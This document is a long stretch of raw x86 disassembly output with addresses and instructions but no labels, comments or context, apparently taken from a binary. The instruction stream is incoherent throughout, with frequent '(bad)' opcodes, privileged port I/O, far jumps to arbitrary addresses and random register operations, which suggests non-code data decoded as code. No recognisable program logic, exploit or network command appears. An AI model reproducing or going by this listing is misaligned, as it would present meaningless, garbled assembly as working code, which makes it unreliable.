  421e91:	mov    dh,0x24
  421e93:	mov    ah,0xb1
  421e95:	mov    esi,0x4e910d5e
  421e9a:	jecxz  0x421e68
  421e9c:	inc    ebx
  421e9d:	fimul  WORD PTR [ebx+ecx*8]
  421ea0:	mov    bh,0x82
  421ea2:	adc    eax,0xd5cf387c
  421ea7:	jle    0x421e8c
  421ea9:	and    eax,0x230acd90
  421eae:	js     0x421ec6
  421eb0:	cli    
  421eb1:	or     al,cl
  421eb3:	inc    eax
  421eb4:	loopne 0x421e36
  421eb6:	scas   al,BYTE PTR es:[edi]
  421eb7:	lds    ebp,FWORD PTR [esi]
  421eb9:	inc    ebp
  421eba:	push   esi
  421ebb:	daa    
  421ebc:	data16 or dh,BYTE PTR [esi+0x6f]
  421ec0:	add    ecx,DWORD PTR [ecx]
  421ec2:	dec    edx
  421ec3:	test   BYTE PTR [ecx-0x67a0c7e4],0xa7
  421eca:	nop
  421ecb:	dec    esi
  421ecc:	fnstenv [edi-0x5e77de2b]
  421ed2:	push   edx
  421ed3:	neg    DWORD PTR [edx]
  421ed5:	and    dh,BYTE PTR [ebp+0x7b]
  421ed8:	hlt    
  421ed9:	jle    0x421ef2
  421edb:	out    dx,eax
  421edc:	shl    bh,1
  421ede:	imul   ebx,DWORD PTR [ebx+edi*8+0x38dfaaea],0xffffff9b
  421ee6:	add    DWORD PTR [ecx],edx
  421ee8:	sti    
  421ee9:	sti    
  421eea:	add    DWORD PTR [eax+edx*8+0x22],eax
  421eee:	mov    DWORD PTR [esi],eax
  421ef0:	mov    edi,0xc037f746
  421ef5:	icebp  
  421ef6:	cli    
  421ef7:	mov    bl,0x56
  421ef9:	sbb    ebx,ecx
  421efb:	mov    edi,0xf70d3d64
  421f00:	sbb    esp,esp
  421f02:	(bad)
  421f05:	nop
  421f06:	jmp    0x421ec9
  421f08:	xchg   edi,eax
  421f09:	xchg   esp,eax
  421f0a:	sbb    al,0x63
  421f0c:	pusha  
  421f0d:	repz mov bl,0x44
  421f10:	(bad)  
  421f11:	jecxz  0x421f24
  421f13:	mov    eax,0x225310ee
  421f18:	ja     0x421e9b
  421f1a:	push   esp
  421f1b:	sahf   
  421f1c:	test   al,0xed
  421f1e:	in     eax,0x50
  421f20:	mov    WORD PTR [ecx-0x434c4cc5],ds
  421f26:	loope  0x421f0f
  421f28:	repnz xlat BYTE PTR ds:[ebx]
  421f2a:	stos   DWORD PTR es:[edi],eax
  421f2b:	mov    ebx,0x81f7f14f
  421f30:	pop    edx
  421f31:	push   0xffffffdd
  421f33:	iret   
  421f34:	outs   dx,BYTE PTR ds:[esi]
  421f35:	fidiv  DWORD PTR [ebp-0x667680ee]
  421f3b:	test   BYTE PTR [edx],0xd1
  421f3e:	mov    al,0xe6
  421f40:	in     al,dx
  421f41:	mov    edx,0xe6c9da84
  421f46:	ss not ah
  421f49:	mov    ecx,0x5710e4c7
  421f4e:	shl    DWORD PTR [ebp-0x78],0xb9
  421f52:	fimul  DWORD PTR [edi]
  421f54:	xor    ah,BYTE PTR [ecx-0x5b]
  421f57:	sbb    edx,DWORD PTR [edx+eax*4]
  421f5a:	enter  0x987f,0xfa
  421f5e:	daa    
  421f5f:	xchg   BYTE PTR [eax+0x1d],al
  421f62:	icebp  
  421f63:	mov    esp,0x45d030cf
  421f68:	pop    ecx
  421f69:	xchg   BYTE PTR [ebx-0x5b],cl
  421f6c:	loope  0x421fa3
  421f6e:	pop    esp
  421f6f:	mov    esp,0x8d5779c1
  421f74:	dec    esi
  421f75:	mov    ds:0x52ff7310,al
  421f7a:	mov    eax,0x4e660e9
  421f7f:	dec    ebp
  421f80:	xchg   esi,eax
  421f81:	push   edi
  421f82:	and    eax,0x23ecd012
  421f87:	push   0x4ecc5818
  421f8c:	mov    eax,0xaf247713
  421f91:	mov    dh,0xed
  421f93:	mul    DWORD PTR [edi+0x301ab59]
  421f99:	add    ebx,ecx
  421f9b:	mov    ds:0x3357360b,al
  421fa0:	inc    ecx
  421fa1:	pop    ecx
  421fa2:	xchg   edx,eax
  421fa3:	std    
  421fa4:	into   
  421fa5:	mov    ds:0x92af87bc,eax
  421faa:	sbb    ah,bh
  421fac:	mov    eax,DWORD PTR [eax]
  421fae:	add    al,0x51
  421fb0:	pushf  
  421fb1:	outs   dx,DWORD PTR ds:[esi]
  421fb2:	mov    ebx,0x4e48e2ed
  421fb7:	jnp    0x421f5c
  421fb9:	enter  0x6037,0x98
  421fbd:	push   esi
  421fbe:	lods   eax,DWORD PTR fs:[esi]
  421fc0:	cmp    eax,DWORD PTR [ebx]
  421fc2:	mov    al,ch
  421fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fc5:	and    eax,0x8435ec58
  421fca:	mov    ebp,0x8a28ee30
  421fcf:	mov    al,ds:0x7f565b2f
  421fd4:	or     ecx,DWORD PTR [ebx*1-0x734b8ef]
  421fdb:	je     0x421fac
  421fdd:	and    eax,0xdfd37fe0
  421fe2:	outs   dx,DWORD PTR ds:[esi]
  421fe3:	inc    ebp
  421fe4:	sub    esi,DWORD PTR [ebx+0x33be9e68]
  421fea:	mov    WORD PTR [esi-0x1d],?
  421fed:	and    DWORD PTR [edx-0x61],edx
  421ff0:	push   edx
  421ff1:	or     eax,0x14c35e56
  421ff6:	jp     0x422036
  421ff8:	mov    cs,WORD PTR [ebp+0x65]
  421ffb:	stc    
  421ffc:	(bad)  
  421ffd:	push   edi
  421ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fff:	xchg   esi,eax
  422000:	xor    DWORD PTR [ebp-0x2],0x63
  422004:	push   cs
  422005:	clc    
  422006:	inc    edx
  422007:	imul   ebx,DWORD PTR [ebp-0x6f],0xffffffd5
  42200b:	jo     0x422019
  42200d:	xchg   esi,eax
  42200e:	adc    bl,0x2e
  422011:	mov    al,ds:0xc850e2bc
  422016:	hlt    
  422017:	(bad)  
  422019:	pop    ds
  42201a:	mov    ecx,0x18227e15
  42201f:	xor    al,bl
  422021:	stos   BYTE PTR es:[edi],al
  422022:	iret   
  422023:	icebp  
  422024:	mov    esp,0x46108a6d
  422029:	xchg   ecx,eax
  42202a:	dec    edi
  42202b:	neg    DWORD PTR [esi]
  42202d:	push   edx
  42202e:	cmp    ecx,ebx
  422030:	jge    0x421fb5
  422032:	dec    edx
  422033:	mov    ch,0x1
  422035:	shr    DWORD PTR [esi+0x3f],0xcf
  422039:	out    0xf7,al
  42203b:	inc    esp
  42203c:	push   0x3
  42203e:	add    DWORD PTR [ebp+0xe],ebp
  422041:	in     eax,dx
  422042:	mov    edx,0xc20c6dd9
  422047:	or     ebx,DWORD PTR [ebx-0xc]
  42204a:	popa   
  42204b:	mov    edx,0xf5bdbd2b
  422050:	add    BYTE PTR [edx+eax*1+0x5aa869e],dh
  422057:	jmp    0x421fdc
  422059:	enter  0x5d8d,0xc6
  42205d:	(bad)  
  42205e:	stos   BYTE PTR es:[edi],al
  42205f:	cmp    eax,DWORD PTR [edi+0x50]
  422062:	cmp    esi,0xffffffcb
  422065:	stc    
  422066:	dec    edx
  422067:	jmp    0x11c93df4
  42206c:	sub    DWORD PTR [edi-0x37],0x12
  422070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422071:	inc    esp
  422072:	(bad)  
  422073:	push   edx
  422074:	mov    edx,0xe40477bb
  422079:	or     esi,DWORD PTR [edi-0x5]
  42207c:	xchg   bl,al
  42207e:	repz add BYTE PTR [edx-0x65],0x6c
  422083:	mov    ebp,eax
  422085:	fimul  WORD PTR [edx-0x4b24309e]
  42208b:	push   es
  42208c:	test   al,0x27
  42208e:	xchg   esp,eax
  42208f:	mov    edx,0x4f98cbf8
  422094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422095:	stc    
  422096:	dec    edi
  422097:	pop    edx
  422098:	and    eax,0x27705661
  42209d:	inc    edi
  42209e:	shl    BYTE PTR [edi],cl
  4220a0:	sbb    al,BYTE PTR [eax]
  4220a2:	ret    
  4220a3:	and    eax,0x5ac43b9e
  4220a8:	add    eax,0x4c07d207
  4220ad:	cmp    dh,ah
  4220af:	dec    ebp
  4220b0:	pop    eax
  4220b1:	(bad)  
  4220b2:	dec    al
  4220b4:	jne    0x4220df
  4220b6:	call   0x64401f9e
  4220bb:	xchg   ecx,eax
  4220bc:	ja     0x422133
  4220be:	cmp    al,0x51
  4220c0:	das    
  4220c1:	pop    ebx
  4220c2:	(bad)  
  4220c3:	cld    
  4220c4:	or     BYTE PTR [edi],ch
  4220c6:	js     0x4220e7
  4220c8:	add    ch,BYTE PTR [esi+eax*1]
  4220cb:	test   esp,ebp
  4220cd:	fprem1 
  4220cf:	push   edi
  4220d0:	jmp    0x3af1:0xd545c9a8
  4220d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220d8:	mov    ah,0xca
  4220da:	mov    ds:0x9cdaa308,eax
  4220df:	arpl   WORD PTR [ebp-0x23e12fe2],dx
  4220e5:	pop    ss
  4220e6:	adc    esp,DWORD PTR [ecx+0x42a877d5]
  4220ec:	cmp    DWORD PTR [ebp-0x4389d016],ebp
  4220f2:	xchg   ebp,eax
  4220f3:	fstp   QWORD PTR ds:0x1bae23ec
  4220f9:	jl     0x42208a
  4220fb:	dec    esi
  4220fc:	jg     0x422150
  4220fe:	ss out 0xb3,eax
  422101:	fisubr DWORD PTR [edx-0x1244691d]
  422107:	jl     0x42215a
  422109:	cmp    al,BYTE PTR [ebx+esi*2-0x225b44d2]
  422110:	ror    BYTE PTR ds:0xf2c41ecd,1
  422116:	and    al,0xa8
  422118:	mov    ecx,0x4aadf455
  42211d:	(bad)  
  42211f:	imul   BYTE PTR [edx+0x1477375]
  422125:	ret    
  422126:	test   eax,0x841a833b
  42212b:	out    0x3a,eax
  42212d:	push   esp
  42212e:	add    eax,0xf270366d
  422133:	push   0xb8b8ad1b
  422138:	mov    cl,0xd9
  42213a:	aas    
  42213b:	add    eax,0x2e985249
  422140:	inc    esp
  422141:	push   ebp
  422142:	dec    ebp
  422143:	sbb    ebp,ecx
  422145:	lods   eax,DWORD PTR ds:[esi]
  422146:	lods   eax,DWORD PTR ds:[esi]
  422147:	pop    ecx
  422148:	shl    BYTE PTR [edx+eax*1-0x232e12bb],0xff
  422150:	out    dx,al
  422151:	ret    
  422152:	int3   
  422153:	sub    BYTE PTR [esi+ebp*4],0xd2
  422157:	add    dh,bh
  422159:	sub    dl,bl
  42215b:	sti    
  42215c:	sub    BYTE PTR [edx],bl
  42215e:	mov    ecx,0x53d81f9f
  422163:	call   0x3258:0x3d355e07
  42216a:	lahf   
  42216b:	pop    ebp
  42216c:	div    BYTE PTR [edx+0x66]
  42216f:	dec    esp
  422170:	sbb    al,0x91
  422172:	mov    esi,0x94f51ab9
  422177:	jmp    0x4221c5
  422179:	stc    
  42217a:	push   ss
  42217b:	mov    al,0xfe
  42217d:	lds    ebx,FWORD PTR [esi-0x4dcc3fd2]
  422183:	mov    cl,0x5c
  422185:	mov    ah,0x88
  422187:	push   ecx
  422188:	das    
  422189:	xchg   edi,eax
  42218a:	sbb    BYTE PTR [esi-0x913395d],dh
  422190:	dec    edi
  422191:	outs   dx,DWORD PTR ds:[esi]
  422192:	mov    bl,0x1d
  422194:	popa   
  422195:	and    BYTE PTR [ecx-0x5],0x47
  422199:	jb     0x42213a
  42219b:	icebp  
  42219c:	je     0x42216f
  42219e:	loopne 0x422206
  4221a0:	fmulp  st(0),st
  4221a2:	(bad)  
  4221a3:	ror    BYTE PTR [ebp+0x7d],cl
  4221a6:	mov    ebx,0x3d018806
  4221ab:	or     BYTE PTR [ebx],0x60
  4221ae:	dec    eax
  4221af:	shr    ecx,0xf7
  4221b2:	xor    eax,0xe355d938
  4221b7:	sub    dh,ch
  4221b9:	std    
  4221ba:	sub    DWORD PTR [esi],0xfffffffd
  4221bd:	out    dx,al
  4221be:	enter  0x87b,0xc8
  4221c2:	jo     0x4221fa
  4221c4:	cmp    BYTE PTR [ebx],al
  4221c6:	add    dh,bh
  4221c8:	pop    eax
  4221c9:	or     BYTE PTR [edx+0x4f],cl
  4221cc:	jb     0x4221c7
  4221ce:	loope  0x42217b
  4221d0:	cwde   
  4221d1:	jne    0x4221c9
  4221d3:	mov    ch,0x26
  4221d5:	mov    WORD PTR [ebp+edx*4-0x6e],?
  4221d9:	out    dx,al
  4221da:	jle    0x42216a
  4221dc:	mov    ebp,0x7b5e4aa1
  4221e1:	fistp  QWORD PTR [ebx+0x6a3ab42a]
  4221e7:	dec    edi
  4221e8:	pop    edx
  4221e9:	jmp    0xc6a6:0x7802154a
  4221f0:	call   0x34a3d9f7
  4221f5:	sub    DWORD PTR [edi-0x3c6c8e7f],edi
  4221fb:	adc    ch,BYTE PTR [edx-0x10]
  4221fe:	mov    bl,0x26
  422200:	inc    esi
  422201:	adc    BYTE PTR [edi],bh
  422203:	push   ds
  422204:	mov    dl,0xd3
  422206:	(bad)  
  422207:	cmp    ch,BYTE PTR [eax+0x5d19506f]
  42220d:	mov    ebx,0x5cceb40e
  422212:	and    cx,si
  422215:	gs inc eax
  422217:	je     0x42220e
  422219:	fisub  DWORD PTR ds:0xfcec7a58
  42221f:	gs and al,0x2c
  422222:	and    al,0x61
  422224:	xchg   edi,eax
  422225:	call   0xe27e:0xa51d61f0
  42222c:	addr16 dec ebp
  42222e:	and    ah,BYTE PTR [edx-0x16]
  422231:	imul   ebx,DWORD PTR [ebx-0x2d52a5aa],0x65e7f5ba
  42223b:	pop    ebx
  42223c:	fadd   st(5),st
  42223e:	jmp    0xa87a:0x77f3bb5e
  422245:	jp     0x422273
  422247:	dec    esi
  422248:	pop    eax
  422249:	sub    esp,DWORD PTR [esi-0x8]
  42224c:	sub    ebp,esp
  42224e:	adc    eax,0xd1d5452f
  422253:	fwait
  422254:	push   si
  422257:	push   cs
  422258:	ror    BYTE PTR [eax-0x44323726],0xb0
  42225f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422260:	popa   
  422261:	jecxz  0x422228
  422263:	in     al,0x5e
  422265:	loop   0x422237
  422267:	ret    
  422268:	aaa    
  422269:	(bad)  
  42226a:	inc    esp
  42226b:	jp     0x4222b5
  42226d:	push   eax
  42226e:	ficom  DWORD PTR [esi]
  422270:	ins    DWORD PTR es:[edi],dx
  422271:	outs   dx,DWORD PTR ds:[esi]
  422272:	mov    eax,ds:0x2a3f963b
  422277:	pop    ebp
  422278:	push   eax
  422279:	dec    eax
  42227a:	popf   
  42227b:	push   cs
  42227c:	(bad)  
  42227d:	sub    ebx,ebx
  42227f:	mov    bl,0xf3
  422281:	cmp    BYTE PTR [esi+0x432557f2],bh
  422287:	dec    edi
  422288:	dec    ebp
  422289:	loop   0x42226a
  42228b:	jg     0x422210
  42228d:	inc    eax
  42228e:	rol    DWORD PTR [ecx-0x43],0xac
  422292:	xor    BYTE PTR [ecx],ah
  422294:	xchg   BYTE PTR [esi+0xbdeb8fa],bh
  42229a:	sub    al,0x6
  42229c:	jbe    0x4222af
  42229e:	jns    0x4222a0
	...
  4222a8:	add    BYTE PTR [eax],al
  4222aa:	inc    edx
  4222ab:	inc    esp
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0x58780bdc,eax
  4222b9:	stc    
  4222ba:	cmp    BYTE PTR [ecx+0x67d0001],dh
  4222c0:	add    BYTE PTR [eax],al
  4222c2:	ds imul ebp,ebx,0xffffffd2
  4222c6:	add    al,0xb0
  4222c8:	fldenv [ebx]
  4222ca:	and    ebx,0xffffffd5
  4222cd:	ins    DWORD PTR es:[edi],dx
  4222ce:	and    dh,dl
  4222d0:	pushf  
  4222d1:	cmp    ebp,DWORD PTR [edx+0x49]
  4222d4:	sub    DWORD PTR [ebp-0x7984ec82],edi
  4222da:	(bad)  [edi-0x10119e8c]
  4222e0:	arpl   bp,bp
  4222e2:	sbb    al,0x9a
  4222e4:	add    BYTE PTR [edx+0x36],ah
  4222e7:	jecxz  0x422356
  4222e9:	add    al,ah
  4222eb:	inc    esi
  4222ec:	lea    ebx,[eax-0x64]
  4222ef:	outs   dx,BYTE PTR ds:[esi]
  4222f0:	mov    ecx,0x39daa3df
  4222f5:	sub    eax,DWORD PTR ds:0xfd662a76
  4222fb:	retf   0x4592
  4222fe:	mov    ss,WORD PTR ds:0xc1f0759f
  422304:	xor    cl,BYTE PTR [ecx]
  422306:	push   esp
  422307:	fist   WORD PTR [edi+0x9afce58]
  42230d:	pop    ecx
  42230e:	cmp    BYTE PTR [esi],cl
  422310:	hlt    
  422311:	adc    esi,DWORD PTR [eax+0x62]
  422314:	inc    ebx
  422315:	inc    ecx
  422316:	push   DWORD PTR [edi+0x47]
  422319:	and    al,0x23
  42231b:	inc    esp
  42231c:	ss cs jne 0x422326
  422320:	cmp    BYTE PTR [edi+0x2b],0xa6
  422324:	pop    ds
  422325:	leave  
  422326:	sub    BYTE PTR [ebx+eiz*2-0x50],0x9
  42232b:	inc    ebx
  42232c:	js     0x422335
  42232e:	repnz mov ?,WORD PTR [eax-0x31]
  422332:	fist   DWORD PTR [ecx]
  422334:	pop    esp
  422335:	jb     0x4222d4
  422337:	inc    ebx
  422338:	push   eax
  422339:	xor    esp,DWORD PTR [edi-0x47]
  42233c:	call   0x21f1:0x8cc35642
  422343:	dec    edx
  422344:	sub    BYTE PTR [ebx-0x1d68431],dl
  42234a:	sti    
  42234b:	inc    eax
  42234c:	mov    dl,0x20
  42234e:	pop    ebp
  42234f:	sbb    bh,BYTE PTR [ecx-0xd]
  422352:	sbb    ebp,0x72225ebf
  422358:	sbb    ch,BYTE PTR [ebp-0x1e]
  42235b:	xlat   BYTE PTR ds:[ebx]
  42235c:	loope  0x4223d8
  42235e:	push   esi
  42235f:	mov    esi,0x2f661693
  422364:	fsub   st,st(0)
  422366:	out    0x73,eax
  422368:	ret    0x1482
  42236b:	ds pop eax
  42236d:	mov    dh,0xa
  42236f:	push   ss
  422370:	dec    edx
  422371:	test   eax,0x4e1e00c
  422376:	jp     0x42234e
  422378:	fcom   st(5)
  42237a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42237b:	das    
  42237c:	mov    al,0xf
  42237e:	add    DWORD PTR [eax+0x17],ebx
  422381:	loop   0x4223ff
  422383:	mov    ebp,0xc10d6c84
  422388:	push   esp
  422389:	adc    BYTE PTR [ebx+0x234771bf],bl
  42238f:	xor    dh,ch
  422391:	aam    0x7a
  422393:	jmp    0x4d242b88
  422398:	out    dx,al
  422399:	sub    DWORD PTR ss:[edi+0x1f],eax
  42239d:	fnsave ds:0xca98c556
  4223a3:	cmp    al,0x79
  4223a5:	cs xchg edi,eax
  4223a7:	push   edx
  4223a8:	push   ss
  4223a9:	(bad)  
  4223aa:	mov    dh,0xc4
  4223ac:	sub    eax,0xb704e581
  4223b1:	jecxz  0x422334
  4223b3:	mov    BYTE PTR [ecx-0x5e],0x83
  4223b7:	shl    DWORD PTR [ebp+eax*1+0x52],cl
  4223bb:	stos   DWORD PTR es:[edi],eax
  4223bc:	shr    ah,cl
  4223be:	adc    BYTE PTR [esi-0x33],dh
  4223c1:	lods   eax,DWORD PTR ds:[esi]
  4223c2:	mov    dh,0x6b
  4223c4:	cmp    BYTE PTR [edi+0x528de0de],ch
  4223ca:	xchg   edx,esi
  4223cc:	pusha  
  4223cd:	mov    ebp,0x1c56fa71
  4223d2:	mov    al,0xe5
  4223d4:	das    
  4223d5:	pop    ss
  4223d6:	scas   al,BYTE PTR es:[edi]
  4223d7:	popa   
  4223d8:	cwde   
  4223d9:	call   0x15e0:0x27b51598
  4223e0:	shrd   ecx,ebx,cl
  4223e3:	jae    0x4223c0
  4223e5:	adc    eax,0x6d76210d
  4223ea:	or     ebp,DWORD PTR ds:0x5470aa9f
  4223f0:	push   DWORD PTR [eax+eax*1-0x3c990818]
  4223f7:	adc    cl,BYTE PTR [eax]
  4223f9:	not    dh
  4223fb:	cmp    ebp,edx
  4223fd:	dec    ebp
  4223fe:	push   esp
  4223ff:	out    0x84,eax
  422401:	adc    al,0x14
  422403:	xor    eax,0x29b83211
  422408:	jns    0x4223da
  42240a:	xor    bl,BYTE PTR [ebp+edx*8+0x0]
  42240e:	divps  xmm2,xmm1
  422411:	test   DWORD PTR [ebp-0x3bfe3d6e],esi
  422417:	mov    dh,0xb3
  422419:	push   DWORD PTR [esi+0x5fde5794]
  42241f:	mov    WORD PTR [ebp-0x2e7ec7b0],ss
  422425:	jbe    0x422436
  422427:	inc    ebp
  422428:	or     BYTE PTR [edi+esi*1-0x117656eb],dl
  42242f:	inc    edx
  422430:	xor    eax,0xb4d3a376
  422435:	iret   
  422436:	enter  0x4264,0x87
  42243a:	or     BYTE PTR [ebp+0x5bdfdefb],0x43
  422441:	int3   
  422442:	rcl    DWORD PTR [edx+edx*4+0x4fc78f74],0xa5
  42244a:	and    DWORD PTR [ebx+0x5],edi
  42244d:	pop    edi
  42244e:	xchg   eax,ebp
  422450:	lea    ecx,es:[esi+0x59]
  422454:	mov    esi,0x50bde29a
  422459:	xchg   BYTE PTR [eax-0x723a87ea],dl
  42245f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422460:	sbb    al,0x9
  422462:	push   DWORD PTR [edi-0x4be4e561]
  422468:	cmc    
  422469:	es pop es
  42246b:	lea    ecx,[edx+0x460e72f4]
  422471:	xchg   ebx,eax
  422472:	enter  0x345b,0x34
  422476:	jmp    0x422477
  422478:	or     BYTE PTR [edx],bl
  42247a:	push   es
  42247b:	je     0x4224e2
  42247d:	push   ss
  42247e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247f:	enter  0x4697,0x31
  422483:	cmp    DWORD PTR [ebx-0x79f2c3bd],0x52
  42248a:	nop
  42248b:	repz pop ss
  42248d:	xor    DWORD PTR [eax+0x7],ebp
  422490:	retf   0x9588
  422493:	lahf   
  422494:	xor    al,0x82
  422496:	mov    ds:0x7514f319,eax
  42249b:	adc    dl,BYTE PTR [esi-0x7b]
  42249e:	scas   al,BYTE PTR es:[edi]
  42249f:	add    eax,0x621b80c9
  4224a4:	fild   QWORD PTR [ebx-0x199dd721]
  4224aa:	gs stc 
  4224ac:	pop    esp
  4224ad:	daa    
  4224ae:	popf   
  4224af:	xor    BYTE PTR [ebx],bl
  4224b1:	lods   al,BYTE PTR ds:[esi]
  4224b2:	adc    DWORD PTR [esi+0x22],eax
  4224b5:	cld    
  4224b6:	cmp    al,0x94
  4224b8:	clc    
  4224b9:	push   esi
  4224ba:	mov    esi,0x8fd0fec7
  4224bf:	and    edx,0x6
  4224c2:	jmp    0x422462
  4224c4:	out    0x63,eax
  4224c6:	test   DWORD PTR [edi+0x4b640e8d],edx
  4224cc:	xor    dh,BYTE PTR [edi-0x1605b439]
  4224d2:	(bad)  
  4224d3:	jae    0x422486
  4224d5:	repnz mov ch,0x27
  4224d8:	idiv   BYTE PTR [esp+edi*4]
  4224db:	das    
  4224dc:	dec    edi
  4224dd:	and    DWORD PTR [edi+0x2],0x3
  4224e1:	dec    ecx
  4224e2:	lods   eax,DWORD PTR ds:[esi]
  4224e3:	mov    ecx,eax
  4224e5:	inc    edi
  4224e6:	popf   
  4224e7:	std    
  4224e8:	pusha  
  4224e9:	mov    edx,0x3945cce6
  4224ee:	(bad)  
  4224ef:	pushf  
  4224f0:	rcl    DWORD PTR [ebx],cl
  4224f2:	shr    DWORD PTR [edi-0x3e],cl
  4224f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224f6:	jo     0x422496
  4224f8:	pop    ebp
  4224f9:	hlt    
  4224fa:	inc    eax
  4224fb:	stc    
  4224fc:	sub    ecx,DWORD PTR [esi+0x648297aa]
  422502:	mov    eax,0x8df28436
  422507:	call   0x45a5:0xd46a8312
  42250e:	retf   0x40cd
  422511:	sub    ebx,DWORD PTR [ebx+0x48758541]
  422517:	push   edi
  422518:	iret   
  422519:	(bad)  
  42251b:	adc    eax,0x2e0d7d1b
  422520:	aad    0xf9
  422522:	mov    al,0xa4
  422524:	jge    0x4224e7
  422526:	inc    esi
  422527:	lock sub bh,BYTE PTR [edi+0x4c6f2a83]
  42252e:	push   es
  42252f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422530:	jbe    0x422536
  422532:	shl    BYTE PTR [ebx-0x10465abf],cl
  422538:	inc    edx
  422539:	fistp  DWORD PTR [ebx+0x3698597]
  42253f:	stos   DWORD PTR es:[edi],eax
  422540:	mov    bl,0x3e
  422542:	mov    ecx,0x46f131c4
  422547:	repnz inc ecx
  422549:	adc    BYTE PTR [edi+0x173d2449],0x6c
  422550:	loopne 0x422554
  422552:	jns    0x42258d
  422554:	mov    ah,0x6a
  422556:	xor    eax,0xa97700b1
  42255b:	stc    
  42255c:	cld    
  42255d:	rcl    BYTE PTR [edi],1
  42255f:	icebp  
  422560:	jle    0x42258e
  422562:	add    eax,0x8b05e5b6
  422567:	jnp    0x42259d
  422569:	leave  
  42256a:	dec    esp
  42256b:	mov    al,dh
  42256d:	xchg   ebp,eax
  42256e:	test   DWORD PTR ss:[edi],esp
  422571:	cmp    bl,BYTE PTR [edx]
  422573:	bound  esp,QWORD PTR [esp+ebp*1]
  422576:	mov    ch,0xa9
  422578:	xchg   edx,eax
  422579:	or     cl,dh
  42257b:	and    al,BYTE PTR [eax+esi*2+0x58]
  42257f:	mov    esi,0xcbe03958
  422584:	sub    eax,0x90b2a615
  422589:	nop
  42258a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42258b:	or     esp,eax
  42258d:	jno    0x4225f3
  42258f:	sub    cl,BYTE PTR [esi+0x716bf523]
  422595:	inc    edx
  422596:	mov    DWORD PTR [ebx-0x32e3bb16],edi
  42259c:	mov    eax,0x4f43e0e
  4225a1:	xor    DWORD PTR [edx],ecx
  4225a3:	and    ebp,DWORD PTR [eax-0x20]
  4225a6:	jle    0x422583
  4225a8:	xchg   edx,eax
  4225a9:	stos   DWORD PTR es:[edi],eax
  4225aa:	cmp    eax,0xd2b7737f
  4225af:	push   es
  4225b0:	ficomp DWORD PTR [ecx+0x62]
  4225b3:	imul   edx,DWORD PTR [edx+0x2bee3fbf],0x19
  4225ba:	inc    ecx
  4225bb:	xor    dh,al
  4225bd:	lahf   
  4225be:	ins    BYTE PTR es:[edi],dx
  4225bf:	pushf  
  4225c0:	xlat   BYTE PTR ds:[ebx]
  4225c1:	jae    0x422636
  4225c3:	retf   
  4225c4:	cmp    eax,0x6700791d
  4225c9:	xchg   ecx,eax
  4225ca:	cmp    al,0xc8
  4225cc:	rcl    BYTE PTR [edx-0x13b1694a],cl
  4225d2:	fistp  WORD PTR [ecx+0x43]
  4225d5:	repz or DWORD PTR [edi+0x51156a59],edi
  4225dc:	jbe    0x42262e
  4225de:	not    BYTE PTR [edx]
  4225e0:	xchg   BYTE PTR [edi],bl
  4225e2:	pop    DWORD PTR [ecx+0x717fa211]
  4225e8:	cmp    dl,al
  4225ea:	adc    eax,0x661a5756
  4225ef:	jo     0x4225c5
  4225f1:	cmp    eax,0x85568922
  4225f6:	cli    
  4225f7:	js     0x4225e2
  4225f9:	retf   
  4225fa:	sub    ch,BYTE PTR [ebp-0x5343f546]
  422600:	das    
  422601:	adc    ebx,esi
  422603:	dec    ecx
  422604:	mov    bl,0xbc
  422606:	xor    DWORD PTR [ebx],0x3940d9fb
  42260c:	xor    eax,0x60e34442
  422611:	aaa    
  422612:	or     BYTE PTR [esp+eiz*8-0x2a9c8540],dl
  422619:	sub    edi,DWORD PTR [ebx+0x5d]
  42261c:	sub    BYTE PTR [ecx],ah
  42261e:	(bad)
  422621:	jecxz  0x4225ab
  422623:	inc    eax
  422624:	call   0x5917:0x6d63d0dd
  42262b:	pop    esi
  42262c:	push   ebp
  42262d:	fs push ds
  42262f:	sub    eax,0xcd8d6696
  422634:	pushf  
  422635:	push   0x6443fa9f
  42263a:	retf   0xebc0
  42263d:	inc    esp
  42263e:	jecxz  0x422674
  422640:	adc    cl,BYTE PTR [ecx]
  422642:	imul   eax,ebp,0x66d71369
  422648:	xchg   edi,eax
  422649:	popf   
  42264a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264b:	or     al,0xe4
  42264d:	es gs jge 0x422601
  422651:	imul   esp,DWORD PTR [esi+ecx*4-0x74c49194],0xe1e39dee
  42265c:	loope  0x42268d
  42265e:	daa    
  42265f:	(bad)  
  422660:	mul    WORD PTR gs:[ebp+0x340e4821]
  422668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422669:	out    0xe,al
  42266b:	adc    al,cl
  42266d:	pop    ebp
  42266e:	mov    esi,DWORD PTR [ebx]
  422670:	(bad)  [ebx+0x2a]
  422673:	in     eax,0xc1
  422675:	mov    dh,0x15
  422677:	in     eax,0xa4
  422679:	ins    BYTE PTR es:[edi],dx
  42267a:	inc    DWORD PTR [ebx+0x4c]
  42267d:	push   ds
  42267e:	pop    edi
  42267f:	out    0x40,al
  422681:	ror    al,0xc5
  422684:	dec    edx
  422685:	jns    0x4226ea
  422687:	inc    esi
  422688:	adc    BYTE PTR [ebx-0x393f9c64],dh
  42268e:	popa   
  42268f:	test   al,0x7
  422691:	retf   0x22a3
  422694:	sbb    DWORD PTR [edi-0x3af7f303],esi
  42269a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42269b:	outs   dx,BYTE PTR ds:[esi]
  42269d:	dec    eax
  42269e:	mov    WORD PTR [edi],gs
  4226a0:	(bad)  
  4226a1:	aas    
  4226a2:	mov    ch,bl
